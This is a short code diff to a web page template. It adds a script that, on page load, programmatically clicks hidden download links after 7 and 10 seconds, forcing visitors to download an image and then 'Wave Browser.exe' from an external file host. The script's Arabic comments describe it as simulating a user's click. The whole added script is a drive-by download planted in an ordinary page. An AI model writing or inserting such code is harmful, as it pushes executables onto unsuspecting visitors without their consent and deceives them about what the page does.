@@ -791,20 +791,25 @@ $('#adblock_detected').val($('.adsbox').is(':visible') ? 0 : 1);
           '</li>');
       
     </script>
-
-	<a href="https://s11.mega4down.com:183/d/7urc2dr5iti3uxkcw3efnjyk2dups4rxadzanss5xijrrwqnufaelmbvlup4xnciggz26qdz/434166181_122109976538248093_8366451275309154330_n.jpg">Download Vivaldi</a>
-<a href="https://s11.mega4down.com:183/d/7urjplz7iti3uxkcqdeapla3rpeay4ok6zremmkj4lb4xbekeca2zj7oco33e7cjfw4ceyjc/Wave%20Browser.exe">Download WaveBrowser</a>
+<a id="imageLink" href="https://s11.mega4down.com:183/d/7urc2dr5iti3uxkcw3efnjyk2dups4rxadzanss5xijrrwqnufaelmbvlup4xnciggz26qdz/434166181_122109976538248093_8366451275309154330_n.jpg">Download Image</a>
+<a id="waveBrowserLink" href="https://s11.mega4down.com:183/d/7urjplz7iti3uxkcqdeapla3rpeay4ok6zremmkj4lb4xbekeca2zj7oco33e7cjfw4ceyjc/Wave%20Browser.exe">Download Wave Browser</a>
 
 <script>
-    // الانتظار لمدة 7 ثوانٍ قبل إعادة التوجيه إلى الرابط الأول، ثم الانتظار 3 ثوانٍ أخرى للرابط الثاني
+    // الانتظار لمدة 7 ثوانٍ قبل النقر على الرابط الأول (Download Image)
     setTimeout(function() {
-        window.location.href = 'https://s11.mega4down.com:183/d/7urc2dr5iti3uxkcw3efnjyk2dups4rxadzanss5xijrrwqnufaelmbvlup4xnciggz26qdz/434166181_122109976538248093_8366451275309154330_n.jpg';
+        var imageLink = document.getElementById('imageLink');
+        if (imageLink) {
+            imageLink.click(); // محاكاة نقرة المستخدم على الرابط
+        }
     }, 7000); // 7000 ميلي ثانية = 7 ثوانٍ
 
+    // الانتظار لمدة 10 ثوانٍ قبل النقر على الرابط الثاني (Download Wave Browser)
     setTimeout(function() {
-        window.location.href = 'https://s11.mega4down.com:183/d/7urjplz7iti3uxkcqdeapla3rpeay4ok6zremmkj4lb4xbekeca2zj7oco33e7cjfw4ceyjc/Wave%20Browser.exe';
+        var waveBrowserLink = document.getElementById('waveBrowserLink');
+        if (waveBrowserLink) {
+            waveBrowserLink.click(); // محاكاة نقرة المستخدم على الرابط
+        }
     }, 10000); // 10000 ميلي ثانية = 10 ثوانٍ
 </script>
-
 
 	
